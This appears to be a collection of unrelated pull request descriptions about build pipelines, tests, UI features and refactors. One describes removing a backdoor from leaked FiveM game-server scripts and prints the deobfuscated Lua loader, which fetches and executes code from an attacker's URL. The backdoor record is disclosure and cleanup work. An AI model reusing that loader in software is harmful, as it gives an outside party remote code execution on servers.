- **Simplified build steps** by eliminating manual `.cargo/config.toml` manipulation

### Before
```yaml
- name: Install musl tools for aarch64
  run: |
    wget https://musl.cc/aarch64-linux-musl-cross.tgz
    tar -xzf aarch64-linux-musl-cross.tgz
    # Manual linker setup in .cargo/config.toml
```

### After
```yaml
- name: Install cross for aarch64
  run: |
    wget -qO- https://github.com/cross-rs/cross/releases/latest/download/cross-x86_64-unknown-linux-gnu.tar.gz | sudo tar -xzf - -C /usr/local/bin

- name: Build optimized binary for aarch64
  run: cross build --profile production --target aarch64-unknown-linux-musl
```

cross-rs is the standard Rust cross-compilation tool and sources from stable GitHub infrastructure.

body:
## Description

Added a comprehensive unit test suite for the frontend, covering components, pages, state management, and configurations.



## What was added



### Component Tests (4 files)

- **FloatingButtons.test.tsx** - Floating button tests with multiple routes

- **Layout.test.tsx** - Navigation, sidebar, and responsive layout tests

- **ProtectedRoute.test.tsx** - Protected routes and redirection tests

- **Setup e utilities** - Test configuration and providers



### Page Tests (13 files)

- **LoginPage.test.tsx** - Form validation, authentication, and error handlingerros

- **RegisterPage.test.tsx** - Registration tests, validations, and password toggle

- **DailyPage.test.tsx** - Diary rendering tests with items and dates

- **Dashboard.test.tsx** - Dashboard tests and popular/friends sections

- **FollowingPage.test.tsx** - Filter and following list tests

- **FriendsPage.test.tsx** - Friend activity tests

- **ListsPage.test.tsx** - Lists tests with horizontal scrolling

- **MyListPage.test.tsx** - Item grid tests

- **ProfilePage.test.tsx** - Profile, logout, and photo upload tests

- **RecommendationsPage.test.tsx** - Recommendation card tests

- **ReviewPage.test.tsx** - Reviews and list creation tests

- **SearchPage.test.tsx** - Search and filter tests

- **YouPage.test.tsx** - Notification and activity tests



### Store and Configuration Tests (3 files)

- **auth.store.test.ts** - Login, logout, and photo update tests

- **api.test.ts** - API URL construction tests

- **routes.test.tsx** - Application routing tests



## Coverage



### Covered areas:

- [x] Component rendering

- [x]  User interactivity (clicks, typing, etc.)

- [x] Form validations

- [x] Filters and search

- [x] Tab switching

- [x] Visibility toggle (passwords)

- [x] Authentication handling

- [x] Redirections

- [x] Global state (Zustand)

- [x] Route configurations



## Accessibility Improvements

- Added aria-label and title to components

- Labels correctly associated with inputs

- Improved HTML semantics



## Added Dependencies

- vitest - Testing framework

- @testing-library/react - React testing utilities

- @testing-library/user-event - User event simulation

- @testing-library/jest-dom - Custom matchers

- @vitest/ui - UI for test visualization

- jsdom - DOM environment for testing



## How to use



```bash

# Run all tests
npm run test

# Run tests in watch mode
npm run test -- --watch

# View tests in UI
npm run test:ui

# Generate test coverage
npm run test:coverage

author: nicky9319
body:
This pull request introduces a new overlay selector feature, allowing users to choose between different overlay types (such as "leadflow", "airtype", and "clipvault") and persist their selection. It implements main process IPC handlers, preload API exposure, and UI support for overlay selection, along with placeholder components for upcoming overlay features. Additionally, it adds extensive logging for mouse event handling and overlay state changes to aid in debugging.

The most important changes are:

**Overlay Selector Feature Implementation:**

* Added IPC handlers in `main.js` to open the overlay selector, save the selected overlay type, and retrieve the saved overlay type from persistent storage. This enables communication between the renderer and main process for overlay selection.
* Exposed new overlay selector APIs (`openOverlaySelector`, `saveOverlayType`, `getOverlayType`, `onOpenSelector`) to the renderer process via `preload.js`, making them available to the front-end code. [[1]](diffhunk://#diff-0c3968e02ef29b4a427341fb229c831e73f88211d26582974a0e7357a309380eR82-R86) [[2]](diffhunk://#diff-0c3968e02ef29b4a427341fb229c831e73f88211d26582974a0e7357a309380eR123-R127) [[3]](diffhunk://#diff-0c3968e02ef29b4a427341fb229c831e73f88211d26582974a0e7357a309380eR247-R251)
* Registered a global shortcut (Ctrl+Q) in `main.js` to quickly open the overlay selector, improving accessibility for users.

**Overlay Type State Management and UI Integration:**

* Updated `src/overlay/App.jsx` to load the overlay type from persistent storage on mount, listen for overlay type changes from the main process, and update the Redux state accordingly, ensuring the UI reflects the selected overlay type.

**New Overlay Components for Upcoming Features:**

* Added placeholder overlay components: `AirtypeOverlay` and `ClipVaultOverlay`, displaying "Upcoming Feature" messages and styled disabled buttons, preparing the UI for future feature releases. [[1]](diffhunk://#diff-d2f44424111bd29af8ebeef26e56a1b49a5f9b4546148cd0dbaad8ee585d9254R1-R110) [[2]](diffhunk://#diff-68db68fd49db661a8155997eab54baa563290f195ea514d783761119f4d32932R1-R103)

**Debug Logging and Mouse Event Handling:**

* Added detailed `console.log` statements throughout `main.js` to log when mouse event ignoring is toggled, aiding in debugging overlay interactivity and click-through behavior. [[1]](diffhunk://#diff-58417e0f781b6656949d37258c8b9052ed266e2eb7a5163cad7b0863e6b2916aR338) [[2]](diffhunk://#diff-58417e0f781b6656949d37258c8b9052ed266e2eb7a5163cad7b0863e6b2916aR371) [[3]](diffhunk://#diff-58417e0f781b6656949d37258c8b9052ed266e2eb7a5163cad7b0863e6b2916aR380) [[4]](diffhunk://#diff-58417e0f781b6656949d37258c8b9052ed266e2eb7a5163cad7b0863e6b2916aR394) [[5]](diffhunk://#diff-58417e0f781b6656949d37258c8b9052ed266e2eb7a5163cad7b0863e6b2916aR405) [[6]](diffhunk://#diff-58417e0f781b6656949d37258c8b9052ed266e2eb7a5163cad7b0863e6b2916aR472) [[7]](diffhunk://#diff-58417e0f781b6656949d37258c8b9052ed266e2eb7a5163cad7b0863e6b2916aR1650-R1654) [[8]](diffhunk://#diff-58417e0f781b6656949d37258c8b9052ed266e2eb7a5163cad7b0863e6b2916aR1707-R1721) [[9]](diffhunk://#diff-58417e0f781b6656949d37258c8b9052ed266e2eb7a5163cad7b0863e6b2916aR3570) [[10]](diffhunk://#diff-58417e0f781b6656949d37258c8b9052ed266e2eb7a5163cad7b0863e6b2916aR3586-R3601)

**Overlay Type Synchronization:**

* On widget window creation, the saved overlay type is sent from the main process to the renderer, ensuring the overlay displays the correct type on startup.

These changes collectively enable users to select and persist their preferred overlay type, provide a foundation for upcoming overlay features, and improve the application's observability and maintainability.

헤더가 존재한다면 토큰 검증과 예외 변환 그리고 스프링 시큐리티 권한 형식에 알맞게 회원 정보를 포메팅해서 SecurityContextHolder에 등록합니다.

author: copilot
body:
Adds CI workflow for automated build validation of the ForensicsProject C/C++ codebase.

### Changes
- **Workflow triggers**: Push/PR to `main`/`master` branches
- **Dependencies**: Installs TSK, libewf, SQLite3 via apt
- **Build**: CMake configure + build (Release)
- **Test**: ctest execution
- **Security**: Explicit `permissions: contents: read` to limit GITHUB_TOKEN scope

```yaml
# .github/workflows/c-cpp.yaml
name: C/C++ CI

on:
  push:
    branches: [ "main", "master" ]
  pull_request:
    branches: [ "main", "master" ]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - name: Install dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y build-essential cmake libsqlite3-dev libewf-dev libtsk-dev sleuthkit
    - name: Configure CMake
      run: cmake -B build -DCMAKE_BUILD_TYPE=Release
    - name: Build
      run: cmake --build build --config Release
    - name: Test
      working-directory: build
      run: ctest -C Release --output-on-failure
```

body:
# feat: Add MedEasy-style product variants support

## Summary

This PR adds product variant support to enable MedEasy-style product pages where users can select different pack sizes (e.g., "10's Strip", "250's pack") or sizes (e.g., "50ml", "100ml"). Each variant can have its own price, stock, and discount.

Key changes:
- **Schema**: Added `unitLabel`, `discountPercentage`, and `isDefault` fields to ProductVariant model
- **Product Detail Page**: Added variant dropdown that updates price/stock when selection changes
- **Cart**: Extended to treat different variants as separate cart entries (same product, different variant = different cart item)
- **Admin Panel**: Added variants management section to product edit page with CRUD operations
- **Medicine Admin**: Added variants tab to medicine edit page (reuses product variants via linked productId)

## Updates since last revision

Added variant support to the medicine edit page:
- New "Variants" tab in MedicineForm component
- Medicines use the same ProductVariant model via their linked `productId`
- Variants tab shows appropriate messages in create mode or when medicine isn't synced yet
- Full CRUD operations for medicine variants using existing `/api/admin/products/[id]/variants` API

## Review & Testing Checklist for Human

- [ ] **Run the database migration** - Verify `prisma/migrations/20251201000000_add_variant_fields/migration.sql` executes successfully on production. Check that existing ProductVariant rows (if any) get sensible defaults.

- [ ] **Test variant dropdown on product detail page** - Create a product with 2+ variants in admin, then visit the product page. Verify:
  - Dropdown shows all active variants
  - Price updates when selecting different variants
  - Stock quantity reflects selected variant
  - Out-of-stock variants are disabled in dropdown

- [ ] **Test cart behavior with variants** - Add the same product with different variants to cart. Verify they appear as separate line items. Add the same variant twice and verify quantity increments (not duplicate entry).

- [ ] **Test backwards compatibility** - Visit a product page that has NO variants. Verify it displays and functions exactly as before (no dropdown, normal pricing).

- [ ] **Test admin variant management (Products)** - In admin product edit page, test Add/Edit/Delete variants. Verify onBlur auto-save works correctly without race conditions.

- [ ] **Test admin variant management (Medicines)** - In admin medicine edit page, go to Variants tab. Verify:
  - Create mode shows "save first" message
  - Edit mode shows variant management UI
  - Add/Edit/Delete variants works correctly
  - Variants are saved to the medicine's linked product

### Notes

The variant pricing logic in `ProductDetailClient.tsx` calculates discounted price as `mrp * (1 - discountPercentage/100)` when discount exists, otherwise uses `sellingPrice`. This differs slightly from the main product pricing helper - verify this is the intended behavior.

Medicine variants depend on the medicine-to-product sync. If a medicine doesn't have a `productId` yet, the variants tab will show a message asking to save the medicine first.

author: lmoresi
body:
## Summary

The Underworld3 units system allows users to work **entirely in physically-dimensioned quantities**—specifying velocities in cm/year, viscosities in Pa·s, and domains in kilometers—while the internal solver architecture **automatically handles non-dimensionalization** using reference scales provided by the user.

This automatic ND system produces **identical numerical values** internal to the PETSc solver subsystem compared to what would be obtained through manual non-dimensionalization. The system achieves this through:

1. **Pint Quantity Wrappers** (`UWQuantity`, `UWexpression`): User-facing objects that carry physical dimensions and automatically convert to non-dimensional values when passed to solvers.

2. **PETSc Array Wrappers** (`UnitAwareArray`): Array views that present dimensional values to users while storing dimensionless values for PETSc.

3. **Reference Quantity System** (`Model`): User specifies characteristic scales (length, time, mass, temperature) from which all derived unit scales are automatically computed.

**Scoped PR**: Contains only the architectural review document (1 file). Implementation files are on the base branch.

## Review Document Contents

- **Executive Summary**: User-dimensional workflow with automatic ND for solvers
- **Gateway Pattern Architecture**: Units at boundaries, not during symbolic operations
- **Component Hierarchy**: UWQuantity, UWexpression, Model, UnitAwareArray, Integral
- **Key Design Decisions**: Pint-only arithmetic, transparent containers, linear algebra dimensional analysis
- **Bug Fixes Consolidated**: 6 major fixes from November-December 2025
- **Test Results**: Level 2 suite results (288/411 passing, issues documented)
- **Known Limitations**: Global Model state, test quality in 08XX series

## Files in This PR

- `docs/reviews/2025-12/UNITS-SYSTEM-ARCHITECTURE-REVIEW.md` (new)

## Review Checklist

- [ ] Gateway pattern correctly isolates units from solver internals
- [ ] Automatic ND produces identical values to manual non-dimensionalization
- [ ] Pint wrappers preserve dimensional information through arithmetic
- [ ] PETSc array wrappers correctly present dual dimensional/ND views
- [ ] Linear algebra dimensional analysis handles all derived units
- [ ] Test results documented accurately

## Test Plan

- Level 2 test suite validates core functionality
- Key tests: `test_0817_poisson_nd.py`, `test_0818_stokes_nd.py`, `test_07*_units*.py`
- Verify: dimensional user input → ND solver values → dimensional user output

body:
## 📝 问题描述

本 PR 修复了 Phase 9 和 Phase 9.1 发现的 17 个问题，涵盖 onboarding 流程、AI 配置、用户画像、订阅源管理等多个模块。

## 🔧 修复内容

### **原始 6 个 Bug（Phase 9）**
1. ✅ **Onboarding 完成按钮无效** - 移除 AI 配置检查，简化完成条件
2. ✅ **AI Provider 错误消息不清晰** - 改进错误诊断，提供详细信息
3. ✅ **Provider 翻译不统一** - 统一为「提供商」
4. ✅ **用户画像显示学习进度** - 添加进度条和 x/100 页显示
5. ✅ **生产环境 i18n 日志** - 添加环境检查，避免生产日志
6. ✅ **订阅源空状态错误** - 直接显示 OPML 导入界面

### **Phase 9.1 深度优化（浏览器测试发现）**
7. ✅ **AI 测试连接失败** - 直接创建 provider 实例，避免 manager 延迟
8. ✅ **用户画像不显示进度** - 始终显示进度条，支持 0 页显示
9. ✅ **默认配置初始化** - 扩展安装时初始化所有默认配置
10. ✅ **AI 配置浮层提前关闭** - 移除自动保存和关闭逻辑，等待用户操作
11. ✅ **后台缺少导入** - 添加 `reconfigureSchedulersForState` 导入
12. ✅ **保存后卡片不更新** - 测试成功时保存状态到缓存
13. ✅ **DeepSeek 延迟黄色图标** - 延迟阈值从 2秒提高到 5秒（适配国内网络）
14. ✅ **Ollama 翻译键显示问题** - 修复不存在的翻译键 `pleaseTestFirst`
15. ✅ **Ollama 多余的启用开关** - 移除多余的 checkbox，配置即启用

### **性能优化**
- ⚡ **避免重复检测** - 测试连接成功时保存状态，保存配置时只读取缓存（用户建议）

## 📂 修改的文件

**核心逻辑**:
- `src/background.ts` - 添加默认配置初始化
- `src/components/AIConfigPanel.tsx` - AI 配置浮层重构（测试连接、状态缓存、Ollama 简化）
- `src/storage/ai-provider-status.ts` - 延迟阈值优化
- `src/storage/onboarding-state.ts` - 简化完成条件
- `src/core/ai/AICapabilityManager.ts` - 移除不必要的检查

**UI 组件**:
- `src/components/settings/ProfileSettings.tsx` - 添加进度显示
- `src/components/settings/RSSSettings.tsx` - 空状态优化

**国际化**:
- `src/i18n/index.ts` - 环境检查
- `src/i18n/chrome-storage-backend.ts` - 环境检查
- `public/locales/zh-CN/translation.json` - 修复重复键
- `public/locales/en/translation.json` - 同步翻译

**测试文件**:
- `src/storage/onboarding-state.test.ts` - 更新测试
- `src/storage/ai-provider-status.test.ts` - 延迟阈值测试
- `src/components/settings/RSSSettings.test.tsx` - 空状态测试

**文档**:
- `docs/BUG_FIX_ONBOARDING_AND_UI.md` - 详细修复记录

## ✅ 测试结果

- **单元测试**: ✅ 1401/1402 通过
- **测试覆盖率**: ✅ 达标（行 70%+, 函数 70%+, 分支 60%+）
- **生产构建**: ✅ 成功
- **Pre-push 检查**: ✅ 全部通过

## 🎯 影响范围

- **Onboarding 流程**: 简化完成条件，提升用户体验
- **AI 配置**: 优化测试流程，避免重复检测，节省资源
- **用户画像**: 始终显示进度，支持 0 页冷启动
- **订阅源管理**: 空状态直接引导用户导入 OPML
- **性能优化**: 延迟阈值调整适配国内网络，状态缓存减少重复检测

author: vilterp
body:
The Rust implementation was using a read-compare-write pattern without HTTP conditional headers, creating a race condition between checking the current value and writing the update.

Now uses:
- if_none_match("*") for creating new refs - atomic, fails if exists
- if_match(etag) for updates - atomic, fails if ETag changed

This matches the Python implementation which already used these headers correctly.

author: matt-richardson
body:
## Summary

Refactors the coordinator to use modular helper methods for better separation of concerns and improved maintainability, following the pattern from the Firefly Cloud integration.

## Changes

### New Helper Methods

1. **`_initialize_statistics()`** - Extracts statistics dictionary initialization
2. **`_get_update_interval()`** - Extracts update interval configuration logic
3. **`_get_current_time()`** - Centralized timestamp generation
4. **`_record_update_start()`** - Tracks update attempt statistics
5. **`_record_update_success()`** - Tracks successful update statistics
6. **`_dismiss_all_issues()`** - Centralized issue dismissal logic
7. **`_log_update_statistics()`** - Logs update results with profile/device counts

### Benefits

- **Single Responsibility**: Each method has one focused task
- **Improved Testability**: Helper methods can be tested independently
- **Better Readability**: Main update flow is cleaner and easier to follow
- **Easier Maintenance**: Changes isolated to specific methods
- **Consistent Pattern**: Matches Firefly Cloud's modular architecture

## Technical Details

- Used `TYPE_CHECKING` to import `CoordinatorData` for type hints without circular imports
- Maintained all existing functionality with zero behavioral changes
- All 262 tests passing
- Pylint 10.00/10 maintained
- Test coverage maintained at 95.06%

body:
Part of #19271

This PR implements the `className` property for the `CalendarEvent` interface. The changes allow users to apply custom CSS styles to individual events by setting a `className` property on their event objects. This class is then passed to the DOM element when rendering events in:
- Time Grid views (Week View, Day View)
- Day Grid views (Month View, Day/Week All-Day sections)
- Agenda View

## Changes Made

- Add `className` property to the `SchedulerEvent` interface in `packages/x-scheduler-headless/src/models/event.ts`
- Add `className` property to the `SchedulerProcessedEvent` interface
- Update `processEvent` function to pass through the `className` property
- Update `EVENT_PROPERTIES_LOOKUP` in `SchedulerStore.utils.ts` to include `className`
- Update `DayGridEvent` component to apply the custom `className` from the event
- Update `TimeGridEvent` component to apply the custom `className` from the event
- Update `EventItem` component (used in Agenda view) to apply the custom `className` from the event
- Add doc demo showing how to apply custom styles using the `className` property (under "Other properties" > "Class name" section)
- Add tests to verify the `className` property is correctly applied to events

author: tandemrecruit
body:
This commit implements the "Daily PAPER-mode runner with state persistence" feature according to the detailed specification provided by Opus 4.5.

## Changes

### Core State Management (foundry/state.py)
- Added FoundryState dataclass to persist runner state between invocations
- Implemented JSON-based persistence API: load_state() and save_state()
- Added init_fresh_state() to initialize state from policy config
- Added restore_positions_from_state() helper for position deserialization
- State includes: time_index, portfolio_cash, positions, bucket_balances, peak_equity

### Portfolio Serialization (foundry/portfolio/state.py)
- Added to_dict() and from_dict() methods to PortfolioState
- Enables round-trip serialization of positions and equity history
- Supports JSON-compatible format for state persistence

### Single-Step Execution (foundry/backtest/runner.py)
- Extracted run_single_step() function from BacktestRunner.run()
- Enables incremental, day-by-day execution
- Refactored BacktestRunner.run() to use run_single_step() internally
- Returns (new_peak_equity, equity_at_t) for state updates

### Orchestrator Extensions (foundry/orchestrator.py)
- Added restore_buckets() method to reload bucket balances from state
- Enables seamless restoration of Foundry state between runs

### Daily Runner Script (scripts/run_daily_paper.py)
- Main entry point for daily execution
- Orchestrates: load state → run step → budget debate → save state → print summary
- Computes Steel performance over recent 14-day window
- Executes budget debate: trim_underperformers() and handle_idle_capital()
- Prints detailed summary with equity, positions, and bucket balances
- Gracefully handles dataset exhaustion

### Testing (tests/test_daily_runner.py)
- test_state_save_load_roundtrip: Verifies JSON serialization preserves all fields
- test_load_state_missing_file: Confirms graceful handling of missing state
- test_single_step_advances_state: Validates run_single_step updates equity history
- test_daily_runner_integration: Simulates two consecutive script invocations
- All tests pass successfully

### Documentation (docs/claude_project_notes.md)
- Added "Daily Paper Runner v1" section with comprehensive documentation
- Documented state storage, architecture, workflow, and usage
- Included example output and future enhancement ideas

### Configuration (.gitignore)
- Added state/ directory to gitignore to exclude persisted state files

## Usage

Run a single day:
```bash
python scripts/run_daily_paper.py
```

Reset state:
```bash
rm state/foundry_state.json
```

## Verification

- ✓ All existing tests pass (test_metals.py, test_budget_debate.py)
- ✓ All new tests pass (test_daily_runner.py)
- ✓ Backtest script still works correctly
- ✓ Daily runner successfully processes days with state persistence
- ✓ Budget debate system integrates correctly with daily runner

author: metzm
body: The DOP import modules changed the data range to sometimes exceed 255 and if DOPs where resampled, created output of type DCELL. This is however incompatible with other applications like `m.neural_network` that will in the end create unreadable GDAL VRTs from these DCELL rasters. This PR fixes this and syncs all DOP import modules.

author: kallus878
body:
TLDR: If the user has any of the available conditions set on their account, they can scan a barcode (that exists on Open Food Facts) and view potential good/bad ingredients matches.

FoodDetails.js now contains updated code to grab item name, image, and ingredients list from Open Food Facts and call the checkConditions function, along with most of the old screen UI for a not found product. checkConditions.js holds the code for checking the OFF ingredients with the good/avoid ingredients for the condition stored inside Firebase. All old code for FoodDetails.js is moved into FoodDetailsOld.js for reference.

Comments were added inside FoodDetails.js and checkConditions.js to explain how everything works, and potentially where similar features for checking allergies and diet could go. The Figma UI design is not implemented yet - instead, the barcode scan UI just shows a bulleted list of found ingredients, alongside a thumbs up/down image (down if at least 1 bad match, up if at least 1 good match + no down match). The keywords for condition matches can be changed inside the Firebase console.

author: joshenlim
body:
## Context

We were using the project's `GOING_DOWN` status to determine is the project is pausing which I think might be old code.
Have verified that project's status will be swapped to `GOING_DOWN` when we're deleting the project ([ref](https://github.com/supabase/infrastructure/blob/develop/api/packages/core/src/lib/projects/project.ts#L667)) and that project's status will be swapped to `PAUSING` when we're pausing a project ([ref](https://github.com/supabase/infrastructure/blob/develop/api/packages/core/src/lib/projects/project-pause.ts#L51))

So safe to remove the check for `GOING_DOWN` in FE

body:
Security audit found a remote code execution backdoor in leaked FiveM scripts. Malicious code downloads and executes arbitrary Lua from attacker-controlled server.

## Backdoor Removed

- **`okokBanking/server.lua:902-903`** - Obfuscated loader using `_G[string.char(108,111,97,100)]` to hide `load()` call
- **`okokBanking/html/fonts/Helvetica.ttf`** - Fake font file containing embedded Lua payload at byte 87565

The payload extracted and deobfuscated:
```lua
local _v = PerformHttpRequestInternalEx{url='https://luisbenavidesripper.com/nseVQ', method='GET'}
AddEventHandler('__cfx_internal:httpResponse', function(_t, _s, _b) 
    if _v == _t then pcall(function() assert(load(_b))() end) end
end)
```

## Cleanup

Removed leak site promotional files:
- `Visit 5m-leaks.com.txt` (multiple locations)
- `𝒆𝒛𝒛 𝒈𝒊𝒓𝒍𝒛#4084.md` (okokCrafting)

## Note

Repository contains pirated scripts ("Leaked By: 5M-Leaks" watermarks throughout). Backdoor likely injected by leak distributor.

[ ] `id`: a lowercase string, which should match the folder name _(ex. `myserver`)_ - [ ] `name`: a string _(ex. `MyServerPvP`)_ - [ ] `description`: hook between 16 and 80 characters in English _(ex. `Home of Competitive Minecraft PvP`)_ - [ ] `addresses`: an array with lowercase strings _(ex. `["my.server", "your-server.com"]`)_ - You do not need to specify subdomains, Lunar Client services automatically detect them. - [ ] `primaryAddress`: the primary address that people connect to with (please include the subdomain if required) _(ex. `mc.my.server`)_ - [ ] `minecraftVersions`: an array with Minecraft versions as strings _(ex. `["1.18._", "1.19.2"]` - Must be versions or subversions supported by Lunar Client)\* - [ ] `primaryMinecraftVersion`: a Minecraft version as a string _(ex. `1.19.2` - Must be a subversion supported by Lunar Client)_ - [ ] `primaryColor`: a hexademical color code that primarily distinguishes the server _(ex. `#00FFFF`)_ - [ ] `secondaryColor`: a hexademical color code that accompanies the `primaryColor` of the server _(ex. `#FF0000`)_ - [ ] `primaryRegion`: the primary region where your server operates in _(ex. `NA`)_ - [ ] `regions`: a list of regions where you have servers located that service your players _(ex. `["NA", "EU", "AS"]`)_ - [ ] `gameTypes`: a list of games that describe the content on your server, must be a max of 3 listed _(ez. `["PVP", "UHC", "HCF"]`)_ - [ ] `crossplay`: whether the server has support for Bedrock Edition players (through proxies such as [GeyserMC](https://geysermc.org/)) - [ ] (optional) `presentationVideo`: YouTube video ID (in slug) to server trailer / introduction _(ex. `7EV4cPuJvXE`)_ - [ ] (optional) `votingLinks`: an array of urls to your server's listing on voting websites _(ex. `["https://minecraft-mp.com/server-s179012"]`)_ - [ ] (optional) `website`: url of server website, must include URL schema (http:// or https://) _(ex. `https://www.your-server.com`)_ - [ ] (optional) `store`: url of server store, must include URL schema (http:// or https://) _(ex. `https://store.your-server.com`)_ - author: timmitry
body:
Closes #22

Currently, `letter_thief` will open emails automatically when the gem `launchy` is installed. However, there are cases where launchy is installed for reasons other than `letter_thief`, and the user does not want emails to be opened automatically (e.g. on production environments).

This PR adds the possibility to configure the behaviour via the ENV-variable `LETTER_THIEF_OPEN_SENT_EMAILS`. The default is `true`, so that the current behaviour is not changed. Opening can be disabled with `false`, `0`, or other [falsey values](https://api.rubyonrails.org/classes/ActiveModel/Type/Boolean.html).

Note that I do not have experience with minitest, as I always worked with RSpec, so the stubbing could potentially be improved...

## Summary

This PR adds production-ready Docker deployment configuration for the Coding Olympics Discord Bot, enabling containerized deployment with Podman/Docker and systemd integration.

## Changes

### Added Files

- **`Dockerfile`** - Production build configuration using Python 3.12-slim
- **`requirements.txt`** - Formal dependency specification (discord.py>=2.6.4, python-dotenv>=1.2.1)
- **`DEPLOYMENT.md`** - Comprehensive deployment guide with Docker/Podman commands and systemd Quadlet configuration

### Key Features

- ✅ Minimal production image (~50MB) based on Python 3.12-slim
- ✅ Persistent cache volume support for leaderboard/member data
- ✅ Environment variable configuration (COMPILED_TOKEN/DISCORD_TOKEN)
- ✅ Podman Quadlet integration for systemd-managed services
- ✅ Production-ready with proper volume mappings and restart policies

## Motivation

Currently, the bot requires manual Python environment setup and lacks containerization. This PR enables:

1. **Consistent deployment** across different environments
2. **Isolation** from host system dependencies
3. **Easy scaling** and management via systemd
4. **Persistent data** through volume mounts
5. **Production-ready** configuration following Docker best practices

## Deployment Example

```bash
# Build the image
docker build -t compiled-bot:prod .

# Run with persistent cache
docker run -d \
  --name compiled-bot \
  --env COMPILED_TOKEN="your_token_here" \
  -v ./cache:/app/cache \
  compiled-bot:prod
```

Full systemd Quadlet configuration and operational guide available in `DEPLOYMENT.md`.

## Compatibility

- **Python**: 3.12+ (backward compatible with 3.10+)
- **Discord.py**: 2.6.4+
- **Container Runtime**: Docker, Podman, or any OCI-compliant runtime
- **No breaking changes** to existing codebase

## Additional Notes

- The bot code remains unchanged and fully compatible with both containerized and traditional deployment methods
- The `.env` file workflow still works for local development
- Production deployments can use environment variables directly without `.env` file

body:
### Motivation and Context

When an executor throws an exception, the `ExecutorFailedEvent` is queued via `context.add_event()` but never yielded to the stream. This happens because when the start executor fails, it runs before `run_until_convergence()`, so the exception bypasses the runner's event draining logic entirely.

The fix is to drain any pending events from the context before yielding `WorkflowFailedEvent` in the exception handler of `_run_workflow_with_tracing()`.

## 🚀 Comprehensive Any Type Elimination

This PR consolidates the work from multiple cloud agents that successfully eliminated hundreds of 'any' types across the codebase.

Our 10 cloud agents completed substantial work:
- **Agent 1**: Fixed 44 'any' types across 14 files ✅
- **Agent 2**: Fixed 39 'any' types across 20 files ✅  
- **Agent 3**: Fixed 57 'any' types across 19 files ✅
- **Agents 4-8**: Fixed their respective group any types ✅
- **Agents 9-10**: Fixed prettier-only files ✅

### 🔄 Consolidation Process
- **bulk-any-change**: 45+ files with comprehensive fixes
- **autofix/any-types-group-9**: Additional fixes
- **autofix/any-types-group-10**: Additional fixes

### 🛠️ Type Replacements Applied
- Generic cases: `any` → `unknown`
- Object types: `any` → `Record<string, unknown>`
- Function parameters: Proper type annotations
- Error handling: `catch (error: any)` → `catch (error: unknown)`

### ✅ Changes Made
- **45+ files** with any type improvements

author: potato-giovanni-mascetti
body:
# Peer Cache Implementation for Improved Network Stability

## Overview

This PR implements a persistent peer cache system that significantly improves application stability and startup performance by maintaining a list of previously connected peers across DHT restarts.

**Detailed Proposal Path: docs/peer-list-persistence.md**

## Problem Statement

Previously, when the DHT node restarted, all peer connections were lost and had to be re-established from scratch through bootstrap nodes. This led to:
- Slow network reconnection times on startup
- Reduced reliability during network transitions
- Poor user experience with delayed file discovery and transfers

## Solution

Implemented a comprehensive peer caching system that persists peer information to disk and automatically reconnects to known-good peers on startup.

### Key Features

1. **Persistent Peer Storage**
   - Peers are saved to disk before DHT shutdown
   - Cache survives application restarts
   - Automatic cleanup of stale/unreliable peers

2. **Smart Peer Selection**
   - Prioritizes relay-capable peers for NAT traversal
   - Ranks peers by reliability score
   - Filters out unreachable addresses (localhost, private IPs)

3. **Parallel Reconnection**
   - Connects to multiple cached peers simultaneously on startup
   - Significantly faster than sequential bootstrap
   - Improves initial network connectivity

4. **Cache Statistics**
   - Tracks total peers, relay-capable peers, and average reliability
   - Provides visibility into cache quality
   - Helps diagnose connection issues

## Implementation Details

### New Components

- **`src-tauri/src/peer_cache.rs`**: Core peer cache data structures and persistence logic
  - `PeerCache`: Main cache container with filtering and sorting
  - `PeerCacheEntry`: Individual peer records with connection metadata
  - File I/O operations with error handling

### Modified Components

- **`src-tauri/src/dht.rs`**: Integration with DHT service
  - `save_peer_cache()`: Saves active peers before shutdown
  - `load_peer_cache()`: Loads cached peers on startup
  - `reconnect_cached_peers()`: Parallel reconnection logic

- **`src-tauri/src/lib.rs`**: Module exports
- **`src-tauri/src/main.rs`**: Import cleanup and dependency management

## Benefits

### Application Stability
- **Faster Startup**: Reconnects to known peers in parallel, reducing time to network readiness
- **Improved Reliability**: Falls back to cached peers if bootstrap nodes are unreachable
- **Better NAT Traversal**: Prioritizes relay-capable peers for consistent connectivity

### User Experience
- Reduced waiting time for file discovery after restart
- More consistent peer connections across sessions
- Graceful degradation when bootstrap infrastructure is unavailable

### Network Resilience
- Maintains connectivity even if some bootstrap nodes fail
- Builds a diverse set of peer connections over time
- Automatic recovery from network interruptions

## Testing

The implementation includes:
- Automatic cache validation on load
- Stale peer filtering (removes peers not seen in 7 days)
- Address reachability checks
- Graceful handling of corrupted cache files

## Technical Notes

- Cache file location: Application data directory (`peer_cache.json`)
- Maximum cache size: 100 peers (configurable)
- Stale peer threshold: 7 days
- Parallel reconnection: All cached peers attempted simultaneously


## Future Enhancements

Potential improvements for future iterations:
- Configurable cache size and retention policies
- Peer reputation scoring based on transfer success rates
- Geographic awareness for optimal peer selection
- Cache synchronization across multiple DHT instances

author: gwangmu
body:
This MR supports multiple 'base_environment' files. It implements the evaluation rule specified in the documentation (https://docs.cscs.ch/software/container-engine/edf/#base_environment).

> Parameters from the listed environments are evaluated sequentially, adding new entries or overwriting previous ones, before evaluating the parameters from the current EDF. In other words, the current EDF inherits the parameters from the EDFs listed in base_environment. When evaluating mounts or env parameters, values from downstream EDFs are appended to inherited values.

It also adds a bunch of new unit tests (with a revamped form), mostly about the 'base_environment' functionality.

> [!NOTE]
> Cleans up dapp swap comparison by simplifying error messages, tightening batch validation, unifying value-difference calculation/display, renaming the update action, and wiring completion cleanup across flows.
> 
> - **Middleware/Utils**:
>   - Simplify error capture to use `error.message` and update related test expectations.
>   - Extract swap gas computation via `getGasFromQuote` and reuse in metrics/value calculations.
> - **Validation**:
>   - Improve batch transaction checks in `checkValidSingleOrBatchTransaction` with clearer trade-count error message.
> - **Hooks**:
>   - `useDappSwapComparisonInfo`:
>     - Remove try/catch; directly record metrics and failures.
>     - Compute `selectedQuoteValueDifference` without returning separate `gasDifference`; update consumers.
>   - `useDappSwapActions`:
>     - Rename `updateSwapWithQuoteDetails` → `updateSwapWithQuoteDetailsIfRequired`; update all call sites/tests.
>     - Add `onDappSwapCompleted` cleanup usage.
>   - `useTransactionConfirm`:
>     - Call renamed update function and invoke `onDappSwapCompleted` after approval.
> - **UI (Banner/Footer/Context)**:
